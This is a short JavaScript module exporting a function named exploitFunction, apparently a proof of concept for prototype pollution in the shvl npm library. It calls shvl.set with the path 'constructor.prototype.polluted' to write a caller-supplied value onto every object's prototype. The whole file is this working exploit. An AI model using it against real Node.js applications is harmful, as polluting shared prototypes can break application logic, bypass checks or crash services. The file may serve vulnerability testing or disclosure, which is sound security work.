function exploitFunction(payload) {
    var shvl = require("shvl");
    var obj = {};

    shvl.set(obj, "constructor.prototype.polluted", payload.polluted);
}

module.exports = { exploitFunction };